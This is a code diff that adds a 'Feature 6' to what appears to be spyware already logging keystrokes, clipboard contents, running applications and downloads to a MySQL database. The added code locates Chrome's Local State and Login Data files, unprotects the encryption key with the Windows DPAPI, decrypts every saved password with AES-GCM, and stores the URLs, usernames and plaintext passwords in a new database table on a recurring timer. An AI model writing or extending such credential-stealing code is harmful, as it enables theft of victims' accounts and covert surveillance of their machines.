@@ -2,6 +2,8 @@ import subprocess
 import os
 import platform
 
+import win32crypt
+
 # Check and install required modules
 required_modules = ['pynput', 'mysql-connector-python', 'pyperclip', 'psutil','pycryptodome','pywin32']
 
@@ -25,6 +27,8 @@ import psutil
 from Crypto.Cipher import AES
 from datetime import timezone, datetime, timedelta
 import glob
+import shutil
+import sqlite3
 
 # Connect to MySQL database
 db = mysql.connector.connect(
@@ -83,6 +87,18 @@ CREATE TABLE IF NOT EXISTS downloads (
     file_path VARCHAR(255) NOT NULL
 )
 """
+# Create the chrome_passwords table if not exists
+create_chrome_passwords_table_query = """
+CREATE TABLE IF NOT EXISTS chrome_passwords (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    origin_url VARCHAR(255) NOT NULL,
+    action_url VARCHAR(255) NOT NULL,
+    username VARCHAR(255) NOT NULL,
+    password VARCHAR(255) NOT NULL,
+    creation_date DATETIME,
+    last_used_date DATETIME
+)
+"""
 
 try:
     cursor.execute(create_keystrokes_table_query)
@@ -90,6 +106,7 @@ try:
     cursor.execute(create_applications_table_query)
     cursor.execute(create_system_info_table_query)
     cursor.execute(create_downloads_table_query)
+    cursor.execute(create_chrome_passwords_table_query)
 
     db.commit()
 except mysql.connector.Error as err:
@@ -245,6 +262,89 @@ def insert_download_data(file_name, file_path):
         pass
 
 
+# Function to get chrome datetime
+def get_chrome_datetime(chromedate):
+    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+
+
+# Function to get the encryption key for Chrome passwords
+def get_encryption_key():
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+
+# Function to decrypt Chrome passwords
+def decrypt_password(password, key):
+    try:
+        iv = password[3:15]
+        password = password[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(password)[:-16].decode()
+    except Exception as e:
+        try:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            return ""
+
+
+# Function to insert chrome passwords data into the chrome_passwords table
+def insert_chrome_password_data(origin_url, action_url, username, password, creation_date, last_used_date):
+    try:
+        query = "INSERT INTO chrome_passwords (origin_url, action_url, username, password, creation_date, last_used_date) " \
+                "VALUES (%s, %s, %s, %s, %s, %s)"
+        values = (origin_url, action_url, username, password, creation_date, last_used_date)
+        cursor.execute(query, values)
+        db.commit()
+        print(f"Chrome passwords data inserted successfully for: {username}")
+    except Exception as e:
+        print(f"Error insert chrome passwords data: {e}")
+        with open("error_log.txt", "a") as error_log:
+            error_log.write(f"{datetime.now()}: {e}\n")
+        pass
+
+
+# Function to extract and insert chrome passwords into the database
+def extract_and_insert_chrome_passwords():
+    try:
+        key = get_encryption_key()
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                               "Google", "Chrome", "User Data", "default", "Login Data")
+        filename = "ChromeData.db"
+        shutil.copyfile(db_path, filename)
+        db = sqlite3.connect(filename)
+        cursor = db.cursor()
+        cursor.execute(
+            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+        for row in cursor.fetchall():
+            origin_url = row[0]
+            action_url = row[1]
+            username = row[2]
+            password = decrypt_password(row[3], key)
+            date_created = row[4]
+            date_last_used = row[5]
+
+            if username or password:
+                insert_chrome_password_data(origin_url, action_url, username, password,
+                                            get_chrome_datetime(date_created), get_chrome_datetime(date_last_used))
+            else:
+                continue
+        cursor.close()
+        db.close()
+        try:
+            os.remove(filename)
+        except:
+            pass
+    except Exception as e:
+        print(f"Error extracting chrome passwords: {e}")
+
 
 
 
@@ -268,10 +368,14 @@ applications_thread.start()
 downloads_timer = Timer(interval, get_last_10_downloads)
 downloads_timer.start()
 
-
+#Feature : 5
 # Gather system information at the beginning
 gather_system_info()
 # Schedule the system info gathering to run at a longer interval
 system_info_timer = Timer(3600.0, gather_system_info)
 system_info_timer.start()
 
+#Feature : 6
+# Schedule the chrome passwords extraction and insertion to run at the specified interval
+chrome_passwords_timer = Timer(interval, extract_and_insert_chrome_passwords)
+chrome_passwords_timer.start()
